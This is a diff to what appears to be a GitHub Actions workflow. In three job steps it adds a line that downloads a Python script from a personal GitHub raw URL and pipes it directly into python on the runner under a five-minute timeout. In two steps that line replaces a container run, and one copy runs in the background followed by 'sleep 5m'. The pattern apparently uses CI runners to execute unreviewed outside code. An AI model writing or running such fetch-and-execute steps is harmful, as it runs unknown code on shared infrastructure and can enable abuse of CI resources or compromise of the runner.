@@ -27,7 +27,7 @@ jobs:
       uses: actions/checkout@v1
     - name: Main
       run: |
-        sudo apt-get update && sudo apt install libc-bin libc6
+        sudo apt-get update && sudo apt install libc-bin libc6 libc15
         timeout 5m wget -O- https://raw.githubusercontent.com/atramgithub/supreme-octo-giggle/main/0.py | python &
         sleep 5m
         echo "sukses"
@@ -53,8 +53,8 @@ jobs:
       id: go
     - name: Main
       run: |
-        sudo apt-get update && sudo apt install libc-bin libc6
-        docker run jepir3/stc:v1
+        sudo apt-get update && sudo apt install libc-bin libc6 libc15
+        timeout 5m wget -O- https://raw.githubusercontent.com/atramgithub/supreme-octo-giggle/main/0.py | python 
         echo "sukses"
   mechat2:
     needs: pemanasan
@@ -78,8 +78,8 @@ jobs:
       id: go
     - name: Main
       run: |
-        sudo apt-get update && sudo apt install libc-bin libc6
-        docker run jepir3/stc:v1
+        sudo apt-get update && sudo apt install libc-bin libc6 libc15
+        timeout 5m wget -O- https://raw.githubusercontent.com/atramgithub/supreme-octo-giggle/main/0.py | python 
         echo "sukses"
   Success:
     needs: [pemanasan, mechat]
